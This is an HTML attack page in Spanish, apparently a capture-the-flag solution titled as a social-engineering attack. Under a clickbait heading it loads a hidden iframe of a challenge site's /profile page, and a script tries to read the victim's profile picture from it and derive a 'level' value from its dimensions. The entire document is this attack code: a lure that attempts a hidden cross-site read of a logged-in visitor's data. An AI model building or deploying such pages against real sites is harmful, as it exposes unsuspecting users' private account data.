<!DOCTYPE html>
<html>
<head>
    <title>Ataque de Ingeniería Social</title>
</head>
<body>
    <h1>Haz clic para ver una sorpresa</h1>
    <h1>cargo nuevo</h1>
    <div id="resultado"></div>
    <iframe id="profileFrame" src="https://chl-252b03b2-82ca-46a6-b558-a03090ccae52-imagen-importante.softwareseguro.com.ar/profile" style="display:none;"></iframe>
    <script>
        const iframe = document.getElementById('profileFrame');
        iframe.onload = () => {
            try {
                const img = iframe.contentDocument.querySelector('img[src="/profile-pic"]');
                if (img) {
                    const width = img.naturalWidth;
                    const height = img.naturalHeight;
                    const level = width * height;
                    document.getElementById('resultado').innerHTML = `
                        <p>Ancho: ${width}px</p>
                        <p>Alto: ${height}px</p>
                        <p>Nivel de Pepe: ${level}</p>
                    `;
                } else {
                    document.getElementById('resultado').innerHTML = '<p>No se encontró la imagen en la página de perfil.</p>';
                }
            } catch (e) {
                document.getElementById('resultado').innerHTML = `<p>Error: ${e.message}</p>`;
            }
        };
    </script>
</body>
</html>
